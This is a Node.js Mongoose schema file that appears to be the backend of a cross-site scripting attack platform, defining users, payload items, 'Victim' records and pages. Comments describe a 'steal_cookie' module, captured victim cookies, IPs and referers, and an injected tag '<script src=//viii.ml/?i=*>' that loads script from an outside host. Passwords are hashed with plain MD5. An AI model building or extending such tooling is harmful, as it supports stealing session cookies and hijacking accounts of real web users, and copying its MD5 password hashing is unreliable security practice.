var mongoose = require('mongoose'),
    crypto = require('crypto');
var Schema = mongoose.Schema;

var _User = new Schema({
    email:String,
    name:String,
    passwd:String,
    salt:String
});
var _Item = new Schema({
    owner:String,
    name:String,
    payload:String,
    load:{},
    /*
    *   load:{
    *       "steal_cookie":{
    *           "post":"steal_cookie"
    *       }
    *   }
    */
    modules:[]
    /*
    *   modules:[
    *       ["auto_accept", {}],
    *       ["test", {"str":"test"}]
    *   ]
    */
});
var _Victim = new Schema({
    owner:String,
    name:String,
    who:String,
    payload:String,
    load:{},
    modules:{},
    status:{},
    /*
    *   status:{
    *       "Server":{
    *           "referer":["http://127.0.0.1/", "http://localhost/"],
    *           "ip":["127.0.0.1"]
    *       },
    *       "Browser":{
    *           "cookie":["who=yyyyy", "who=what"],
    *           "the_page":["<script src=//viii.ml/?i=*>"]
    *       }
    *   }
    */
    now:String
});
var _Page = new Schema({
    owner:String,
    name:String,
    uri:String,
    modules:{}
});

exports.gethash = function(str){
    return crypto.createHash('md5').update(str).digest('hex');
};
exports.User = mongoose.model('User', _User);
exports.Item = mongoose.model('Item', _Item);
exports.Victim = mongoose.model('Victim', _Victim);
exports.Page = mongoose.model('Page', _Page);
exports.Db = 'mongodb://'+
    process.env.OPENSHIFT_MONGODB_DB_USERNAME+':'+
    process.env.OPENSHIFT_MONGODB_DB_PASSWORD+'@'+
    process.env.OPENSHIFT_MONGODB_DB_HOST+':'+
    process.env.OPENSHIFT_MONGODB_DB_PORT+'/hisoka';
